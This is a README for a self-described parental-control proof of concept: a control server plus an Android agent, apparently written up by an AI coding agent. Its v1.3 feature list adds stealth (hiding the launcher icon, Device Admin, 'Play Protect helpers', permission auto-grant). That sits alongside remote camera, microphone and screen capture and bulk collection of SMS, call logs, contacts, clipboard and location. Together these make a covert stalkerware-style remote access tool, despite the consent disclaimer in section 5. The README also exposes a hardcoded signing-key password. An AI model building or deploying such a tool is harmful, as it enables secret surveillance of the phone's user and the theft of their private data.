# Parental Control PoC — Desktop Server + Android 14 Agent

> **Current build: v1.3** — the Node/MySQL control server in `server-node/` plus the
> signed agent APK `ParentalControl-v1.3-release.apk`. Sections 1–9 below document
> the original Python desktop server + Android agent PoC (v1.2); the v1.3 server and
> its API are documented in `server-node/README.md`.

A working two-part proof of concept:

| Part | Stack | Path |
|---|---|---|
| Desktop control server | Python 3.10+, Tkinter, embedded threaded Flask | `desktop/` |
| Android agent | Kotlin, target/compile SDK 34, min SDK 26 | `android/` |

Everything the phone needs is granted **from the app's own UI**: runtime permission
dialogs and `Settings` intents. No ADB permission grants, no root, no MDM/Device Owner.

---

## 0. v1.3 build (current)

| Part | Stack | Path |
|---|---|---|
| Control server | Node.js 18+, Express, MySQL/MariaDB, TLS | `server-node/` |
| Android agent | Kotlin, min SDK 26, target SDK 34 | `android/` |
| Signed agent APK | release build, v2 signature (lab keystore) | `ParentalControl-v1.3-release.apk` |
| Server smoke test | bash + curl + node, 56 assertions | `server-node/scripts/smoke-test.sh` |

**Artifact under test**

- `ParentalControl-v1.3-release.apk` — 5,271,066 bytes
  - SHA-256 `d964baece078f53001a9a120c81b1c9edfb73110837d0506900d957f3c52ff20`
  - signed, APK Signature Scheme v2, CN=Parental Control PoC (RSA-2048)
- Server: HTTPS on `8443` (self-signed cert in `server-node/certs/`), MariaDB on
  `127.0.0.1:3307`, database `pc69` (14 tables)

**Two independent cadences**

SMS collection is decoupled from command polling, so a fast poll no longer means a hot
inbox query:

| Setting | Default | Range | Applies to |
|---|---|---|---|
| `SYNC_INTERVAL_S` | 60 | 3..600 | `/commands` poll + telemetry upload latency |
| `SMS_INTERVAL_S` | 60 | 3..3600 | how often the agent re-reads the SMS inbox |

- The agent stores the SMS cadence in `AppPrefs` (`sms_interval_ms`) and tracks the last
  accepted sync (`last_sms_sync_at`); `SyncForegroundService` reads the inbox only when
  the cadence has elapsed, and stamps `last_sms_sync_at` **after** the server accepts the
  upload, so a failed POST is retried on the next cycle rather than skipped for an interval.
- `sms_refresh` raises a one-shot `force_sms_sync` flag, so the server can pull an
  immediate inbox read at any time without changing the cadence.
- `set_sms_interval` carries a `seconds` param and is stored per device
  (`devices.sms_interval_s`), so the value survives the `config` block that the server
  re-sends on every poll instead of being overwritten within seconds.
- Both values reach the agent as `sync_interval` and `config.sms_interval_s` on `/enroll`,
  `/commands` and `/config`; the web console's **Send command** panel can drive both.

**v1.3 feature set** (server-reachable, see `server-node/README.md` for endpoints)

- Screen mirroring (`screen_start`/`screen_stop`), still frame retrieval over HTTPS
- Camera still (`camera_photo`) and stream (`camera_stream_start`/`_stop`)
- Microphone capture (`mic_start`/`mic_stop`, segmented WAV upload)
- Stealth: launcher hiding (`hide_app`), Device Admin (`admin_enable`), Play Protect
  helpers, wake lock, permission add-on with optional auto-grant
- Collection: SMS, call logs, contacts, clipboard, usage stats, location, installed apps,
  and permission state reported back to the server on every sync
- Multi-device: one user, many devices, live device list over WebSocket plus REST

**Verification status (this machine, 2026-10-21)**

- `gradlew clean assembleRelease` → `BUILD SUCCESSFUL`, APK signed and verified with
  `apksigner` (v2 scheme)
- `server-node/scripts/smoke-test.sh` → **56 passed, 0 failed**, including a
  `set_sms_interval` round trip that asserts `config.sms_interval_s = 30` while
  `sync_interval` stays at the `.env` value
- Not verified here: on-device behaviour on real hardware. Per the engagement brief the
  APK is installed on a physical device, so the cadence gating path has been reviewed
  and compiled, but its runtime timing has not been exercised on a device by this tool run.

---

## 1. Project layout

```
Prject 69/
├── desktop/
│   ├── server_gui.py          # Tkinter GUI + Flask API + queue bridge
│   └── requirements.txt
├── android/
│   ├── settings.gradle.kts
│   ├── build.gradle.kts
│   ├── gradle.properties
│   ├── gradlew / gradlew.bat / gradle/wrapper/…
│   ├── local.properties       # sdk.dir for this machine (regenerate as needed)
│   └── app/
│       ├── build.gradle.kts
│       ├── proguard-rules.pro
│       └── src/main/
│           ├── AndroidManifest.xml
│           ├── java/com/example/parentalcontrol/
│           │   ├── MainActivity.kt
│           │   ├── AppPrefs.kt
│           │   ├── Helpers.kt
│           │   ├── ApiModels.kt
│           │   ├── ApiService.kt
│           │   ├── ApiClient.kt
│           │   ├── SyncForegroundService.kt
│           │   ├── MyAccessibilityService.kt
│           │   ├── CommandModels.kt      # command / result DTOs
│           │   ├── CommandExecutor.kt    # action dispatch + uploads
│           │   ├── CameraCapture.kt      # Camera2 still capture
│           │   ├── AudioRecorder.kt      # WAV segment recorder
│           │   ├── ScreenShareService.kt # MediaProjection streaming
│           │   └── ScreenConsentActivity.kt
│           └── res/
│               ├── layout/activity_main.xml
│               ├── layout/overlay_blocked.xml
│               ├── xml/accessibility_service_config.xml
│               ├── xml/network_security_config.xml
│               ├── drawable/ic_launcher.xml
│               ├── drawable/ic_block.xml
│               ├── drawable/ic_stat_sync.xml
│               └── values/strings.xml, themes.xml
└── README.md
```

Build output from this workspace:
`ParentalControl-v1.2-release.apk` (5.6 MB, signed) and
`android/app/build/outputs/apk/release/app-release.apk` (same artifact).

---

## 2. Desktop server

### Install and run

```bat
cd "C:\Users\Dell\Desktop\Prject 69\desktop"
python -m pip install -r requirements.txt
python server_gui.py
```

* The GUI opens on the **Connection** tab and immediately listens on `0.0.0.0:3000`.
* It shows the detected LAN IP and a copyable URL such as `http://192.168.1.20:3000`.
* On first launch Windows Firewall asks for network access — **allow Private networks**,
  otherwise the phone cannot reach port 3000. If the Wi-Fi profile is **Public** (the
  default on many machines) Windows blocks inbound traffic even after that prompt; use
  the **Open firewall port 3000** button, which elevates and adds the rule
  `ParentalControl-3000`:

  ```bat
  netsh advfirewall firewall add rule name="ParentalControl-3000" dir=in ^
      action=allow protocol=TCP localport=3000 profile=private,public
  :: remove later
  netsh advfirewall firewall delete rule name="ParentalControl-3000"
  ```

* The IP dropdown lists **every** local IPv4 address with its adapter name, best LAN
  candidate first. A machine with OpenVPN / Hyper-V / Docker adapters otherwise shows
  the tunnel IP, which the phone can never reach — pick the `Wi-Fi` or `Ethernet` entry
  whose subnet matches the phone.
* "Test /api/rules" performs a loopback HTTP GET and shows the raw response.

### Tabs

1. **Connection** — LAN IP, port, copyable URL, start/stop server, live request and
   telemetry counters, device list.
2. **Rules & Controls** — add/remove blocked package names. The list is served
   immediately; the phone picks it up on its next poll (30 s for the accessibility
   service, 60 s for the sync loop).
3. **Telemetry** — four live tables: installed apps, GPS fixes, SMS log, and
   usage/block events. Rows are de-duplicated and capped so a long-running session
   stays responsive.

### API

| Method | Path | Purpose |
|---|---|---|
| `GET` | `/api/rules` | JSON array, e.g. `["com.instagram.android"]` |
| `POST` | `/api/telemetry` | Combined payload (below) |
| `GET` | `/api/health` | `{"status":"ok"}` — used by the app's Test button |

Combined payload accepted by `POST /api/telemetry`:

```json
{
  "device_id": "Pixel-7-1a2b3c",
  "installed_apps": [
    {"package": "com.android.chrome", "label": "Chrome"}
  ],
  "location": {"lat": 48.8584, "lon": 2.2945, "accuracy": 12.5, "timestamp": 1760000000000},
  "sms_logs": [
    {"sender": "+15551234", "body": "hello", "timestamp": 1760000000000}
  ],
  "usage_events": [
    {"type": "usage", "package": "com.android.chrome", "label": "Chrome",
     "total_time_ms": 120000, "timestamp": 1760000000000},
    {"type": "block", "package": "com.instagram.android", "timestamp": 1760000000000}
  ]
}
```

Any section may be omitted or `null`; the server logs whatever is present.
`device_id` is optional and falls back to the remote address.

### Threading model

* Flask runs in a daemon thread via `werkzeug.serving.make_server(..., threaded=True)`.
* Flask **never** touches Tk widgets. Each POST is put on a `queue.Queue`.
* The Tk mainloop drains that queue every 250 ms with `root.after()` and updates the
  treeviews. Rules are protected by a `threading.Lock`.

---

## 3. Build and install the Android app

### Ready-to-install APK (already built)

`Prject 69\ParentalControl-v1.2-release.apk` — 5.6 MB, signed, `targetSdkVersion 34`,
versionCode 3 (installs over 1.0 / 1.1).

```
SHA-256: 79d4f6eebe51a903b753764be2534a01fefe915cf5c0d708e6773702a53e7996
Signer : CN=Parental Control PoC, OU=Lab, O=PoC  (SHA-1 76e550b134d1f47c1e1ee88c911452e06aa9fe9a)
```

Copy it to the phone, open it with the file manager and allow "Install unknown apps"
for that file manager. A fully signed release is required by most OEM installers
(an unsigned APK is rejected with "package appears to be invalid").

### Rebuild from source

```bat
cd "C:\Users\Dell\Desktop\Prject 69\android"
gradlew.bat assembleRelease     :: signed with keystore/poc-release.jks
:: or
gradlew.bat assembleDebug       :: debug-signed, installs fine too
```

The lab signing key lives in `android\keystore\poc-release.jks`
(alias `pocrelease`, passwords `PocParental2024`, wired in `app/build.gradle.kts`).
Generate your own key for anything beyond lab use and keep it out of version control.

The Gradle wrapper, Android SDK path and toolchain are already configured for this
machine (`local.properties` points at `%LOCALAPPDATA%\Android\Sdk`). On another
machine run Android Studio once, or create `local.properties` with your own
`sdk.dir`.

ADB is optional and only used for installation convenience:

```bat
adb install -r "C:\Users\Dell\Desktop\Prject 69\ParentalControl-v1.2-release.apk"
```

---

## 4. Run order on the phone

1. Join the **same Wi-Fi** as the desktop. Guest networks with client isolation will
   not work.
2. Open **Parental Control**, enter the desktop LAN IP (e.g. `192.168.1.20` — no
   `http://`, the port is fixed at 3000), tap **Save**, then **Test connection**.
   The status line should read `Connected … (HTTP 200)`.
3. Grant permissions top to bottom:
   * **Location** → runtime dialog for fine + coarse location and notifications.
   * **SMS monitor** → runtime dialog for `READ_SMS` + `RECEIVE_SMS`; the inbox is
     then read through `Telephony.Sms.Inbox`.
   * **Installed apps** → no dialog (`QUERY_ALL_PACKAGES` is install-time); the switch
     controls whether the inventory is uploaded and immediately shows the visible
     package count.
   * **Usage stats** → opens `Settings.ACTION_USAGE_ACCESS_SETTINGS`; return to the
     app and the switch turns on after the `AppOpsManager` check.
   * **Display over other apps** → opens
     `Settings.ACTION_MANAGE_OVERLAY_PERMISSION` for this package; verified with
     `Settings.canDrawOverlays`.
   * **Accessibility service** → opens Accessibility settings. Enable
     **Parental Control Blocker**. Ocean/OEM builds may hide sideloaded services
     behind **Allow restricted settings** (App info → ⋮).
4. Turn on **Background sync**. A persistent low-importance notification appears and
   the first payload is sent immediately, then every 60 s.
5. Watch the desktop **Telemetry** tab: app inventory, GPS fix, recent SMS and usage
   rows appear within one cycle. The **Connection** tab shows the device label and
   counters.
6. Block something: in **Rules & Controls** add e.g. `com.android.chrome`, wait up to
   30 s, then open Chrome on the phone. The full-screen "App blocked" overlay appears
   and the app is sent home; the event shows in the desktop Events table.

Every switch is re-read from the system in `onResume()`, so revoking a permission in
Settings is reflected as soon as you return to the app.

---

## 5. Technical notes

### Android 14 foreground service
* Declared `android:foregroundServiceType="location|dataSync"` with
  `FOREGROUND_SERVICE_LOCATION` + `FOREGROUND_SERVICE_DATA_SYNC`.
* `ServiceCompat.startForeground(...)` passes `LOCATION|DATA_SYNC` only when the
  location permission is actually held; otherwise it falls back to `DATA_SYNC` and
  avoids a `SecurityException` after a revocation.
* Channel importance is `IMPORTANCE_LOW`, notification is ongoing and opens the app.

### Blocking
* `MyAccessibilityService` listens to `TYPE_WINDOW_STATE_CHANGED`, refreshes
  `/api/rules` every 30 s and keeps a SharedPreferences copy for offline use.
* On a match it inflates `overlay_blocked.xml` through `WindowManager`
  (`TYPE_APPLICATION_OVERLAY`), then calls `performGlobalAction(GLOBAL_ACTION_HOME)`.
* `com.android.settings` and `com.android.systemui` are never blocked so the device
  owner can always reach the screen that disables the service.
* A 1.5 s per-package debounce prevents overlay spam during window transitions.

### Failure handling
* Every network call is inside `try/catch`; a missing desktop only logs and the loop
  retries next cycle. No service crash on connection failure.
* `Helpers.getCurrentLocation` never throws: it falls back to `lastLocation` and
  returns `null` on revocation/timeout.
* Gson DTOs use explicit `@SerializedName`; OkHttp uses 15 s connect / 45 s read
  timeouts and `retryOnConnectionFailure`.

### Permissions and policy
* `QUERY_ALL_PACKAGES` is install-time but Play Store–restricted: it must be declared
  in the Play Console for device-management/parental-control use. Sideloaded debug
  builds do not go through that review.
* `PACKAGE_USAGE_STATS` is a special app access and can only be granted by the user in
  Settings — that is exactly what the toggle launches.
* Cleartext HTTP is enabled because the server is a LAN-only PoC. For production, put
  the Flask API behind TLS (or a reverse proxy) and switch
  `network_security_config.xml` to a scoped config.

### Privacy / use
This is monitoring software. Install it only on a device you own or are authorized to
manage, and disclose its use to the device's user. The desktop API has no
authentication and is reachable by anything on the same LAN — keep it on a trusted
network.

---

## 6. Remote control (screen, camera, microphone, 3 s sync)

The phone polls `GET /api/commands` on **every** cycle, so the sync interval is also
the command latency. Default is **3 s**; the desktop can change it at runtime.

### Command protocol

| Endpoint | Direction | Purpose |
|---|---|---|
| `GET /api/commands?device_id=X` | phone -> PC | returns `{"commands":[{id,action,params}],"sync_interval":3}`; the queue is cleared on delivery and commands older than 120 s are dropped |
| `POST /api/command_result` | phone -> PC | `{id,action,status,message,device_id}`; `status` is `ok`, `error`, `pending_user` or `denied` |
| `POST /api/screen/frame?device_id=X` | phone -> PC | raw JPEG body, latest frame kept in RAM |
| `POST /api/camera/photo?device_id=X` | phone -> PC | raw JPEG body, saved to `captures/` |
| `POST /api/audio/clip?device_id=X` | phone -> PC | raw WAV body (16 kHz mono PCM16), saved to `captures/` |

Actions and their parameters:

| action | params | effect |
|---|---|---|
| `ping` | - | round-trip check, replies with the device model |
| `sync_now` | - | forces one telemetry cycle including a full app inventory |
| `set_interval` | `seconds` (1-600) | changes the poll/telemetry period |
| `screen_start` | `fps` (1-10), `quality` (20-90), `width` (240-1440) | opens the system capture prompt |
| `screen_stop` | - | stops the mirroring service |
| `camera_photo` | `camera`: `back`/`front` | one JPEG still |
| `camera_stream_start` | `interval_ms` (>=2000), `camera` | repeated stills until stopped |
| `camera_stream_stop` | - | stops the loop |
| `mic_start` | `segment_seconds` (1-60), `segments` (0 = until stopped) | WAV segments uploaded as they finish |
| `mic_stop` | - | stops the loop |

### What Android allows without user interaction

* **Camera / microphone** work while `SyncForegroundService` runs with the
  `camera` / `microphone` foreground types. Android 11+ blocks background capture
  unless the service was started while the app was visible, so start **Background
  sync** once with the app on screen. The status bar always shows the camera or
  microphone indicator while a stream is active - that is OS behaviour, not a bug.
* **Screen mirroring always needs one tap.** `MediaProjection` consent can only be
  granted from an Activity, so `screen_start` launches the prompt (the app holds
  `SYSTEM_ALERT_WINDOW`, which allows the background activity start) and also posts
  a high-priority notification as a fallback. Until the user approves, the command
  result is `pending_user`, then `denied` or `ok`.
* The screen stream runs in its own service with foreground type `mediaProjection`,
  registered before `getMediaProjection()` and with a `MediaProjection.Callback`
  registered before `createVirtualDisplay()` - both required on Android 14.

### Using the tab

1. Start sync on the phone, then press **Refresh** in the Remote control tab and pick
   the device.
2. **Start mirroring** -> approve on the phone -> frames appear in *Live screen* at up
   to `fps` per second (one upload in flight at a time).
3. **Take photo** saves `captures/photo_<device>_<stamp>.jpg`; **Open** launches it,
**Open folder** shows everything.
4. **Record 10 s** uploads one WAV; **Stream on** records 10 s segments until
   **Stream off**.
5. Every command and its result appears in the *Command log* with a timestamp.

---

## 7. Network topology (phone behind another PC's hotspot)

If the phone joins a hotspot hosted by **Desktop2**, while this server runs on a
**different** PC on the same Wi-Fi, the phone sits behind Desktop2's NAT
(`192.168.137.x`) and reaches this PC as Desktop2's LAN IP. Two working setups:

**Option A — server on this PC (default)**

1. Open TCP 3000 (button above; the Wi-Fi profile is often Public, which blocks inbound).
2. On the phone, in Chrome, open `http://<pc-lan-ip>:3000/api/health`. You must see
   `{"status":"ok"}`. If this fails, the hotspot is not forwarding to the LAN — use
   Option B.
3. Only after the browser works, enter the same IP in the app.

**Option B — server on Desktop2 (most reliable with a hotspot)**

1. Copy the `desktop` folder to Desktop2, `pip install -r requirements.txt`, run
   `python server_gui.py` there.
2. Phone uses Desktop2's hotspot gateway: **`192.168.137.1`** (verify with
   `ipconfig` on Desktop2 — look for the adapter named "Local Area Connection*" / the
   hotspot adapter, usually `192.168.137.1`).
3. No NAT traversal involved: a hotspot client can always reach its own gateway.

A hotspot client can also reach nothing but the gateway when the hotspot uses
AP/client isolation. In that case Option B is the only topology that works without
changing the network.

---

## 8. Troubleshooting

| Symptom | Check |
|---|---|
| Test connection: "Unreachable" | Open TCP 3000 (firewall button); verify the selected IP is the Wi-Fi/Ethernet one matching the phone's subnet; test `http://<ip>:3000/api/health` in the phone browser |
| Works on the PC but not from the phone | Phone is behind another PC's hotspot NAT — see section 7 |
| **SMS permission denied / no prompt** | Android 13+ puts sideloaded APKs under **Restricted settings**. App info → ⋮ → **Allow restricted settings** (confirm PIN), then Permissions → SMS → **Allow**. If you denied twice, the dialog never reappears — the app now shows a dialog with an **Open app settings** button. MIUI/ColorOS also hide SMS under App info → **Other permissions** |
| SMS granted but no rows | First sync uploads the last 24 h only; the cursor is persisted, so a message must be newer than the last sync |
| Connected but no telemetry | Background sync switch on; wait one interval (3 s default); the persistent notification shows `Last sync HH:mm:ss (every Ns)` |
| Commands do nothing | Remote control tab → Refresh and select the device; the phone must be running background sync; check the *Command log* for `queued` vs the result |
| `screen_start` stays `pending_user` | The capture prompt needs one tap on the phone (notification "Screen sharing requested"); approval cannot be granted remotely |
| Camera/mic command returns `permission not granted` | Grant on the phone: Remote capture → Camera / Microphone switches |
| Camera fails while the screen is off | Android blocks background camera/mic on locked devices; unlock and retry |
| No frames in Live screen | `pip install Pillow` (preview only); confirm frames arrive at `POST /api/screen/frame` in the log |
| No GPS row | Location permission granted; Google Play services present (FusedLocationProvider requires GMS); test outdoors |
| No SMS rows | `READ_SMS` granted; first sync uploads the last 24 h only; cursor is persisted afterwards |
| Usage table empty | Usage access switch on (AppOps must read `MODE_ALLOWED`); open some apps first |
| App not blocked | Package name exact; list refreshed within 30 s; Accessibility service enabled; overlay permission on (otherwise the app is still sent home without a notice) |
| Accessibility switch stays off | Some OEMs rename the service or require "Allow restricted settings" for sideloaded APKs |
| Sync dies after a while | Disable battery optimization for the app on aggressive OEM ROMs |

---

## 9. Verification performed

* `python -m py_compile server_gui.py` — clean.
* Flask test client: rules CRUD, combined telemetry POST (HTTP 200), malformed body
  (HTTP 400), health endpoint — passed.
* Live Tkinter GUI with a real HTTP POST: queue bridge rendered 1 app, 1 location,
  1 SMS and 2 events; counters and device label updated.
* `gradlew assembleDebug` and `gradlew assembleRelease` — `BUILD SUCCESSFUL`.
* Release APK verified with `apksigner verify`: `Verifies`, APK Signature Scheme v2,
  1 signer; `aapt dump badging` confirms `targetSdkVersion 34`, min 26,
  launchable activity `MainActivity`, and every declared permission.
* Server binds on `0.0.0.0:3000` and answered `GET /api/health` on both
  `127.0.0.1` and the Wi-Fi address `192.168.1.124` (HTTP 200).
* Address ranking on this machine returns `192.168.1.124 (Wi-Fi)` first, ahead of
  the Hyper-V, OpenVPN and link-local adapters.
* Remote-control endpoints exercised end to end with a simulated phone over HTTP:
  command queue delivery + clearing, command result, JPEG frame (stored in RAM),
  camera photo written to `captures/`, WAV clip written and re-opened with Python's
  `wave` module (16 000 frames @ 16 kHz), malformed JPEG rejected with HTTP 400, and
  all three UI event types reaching the Tk queue.
* Remote control tab rendered in a live Tk session: tab list, device auto-selection,
  JPEG preview decoded through Pillow (`preview has image: True`), command log row,
  and a command queued from the UI.
* `gradlew assembleRelease` for v1.2 — `BUILD SUCCESSFUL`; `apksigner verify` passes
  and the manifest declares `CAMERA`, `RECORD_AUDIO` and the CAMERA/MICROPHONE/
  MEDIA_PROJECTION foreground-service permissions.
* Phone-side runtime behavior requires the physical device; no device was attached, so
  the capture prompt, Camera2 HAL, AudioRecord and MediaProjection were compiled and
  reviewed but not executed on hardware.
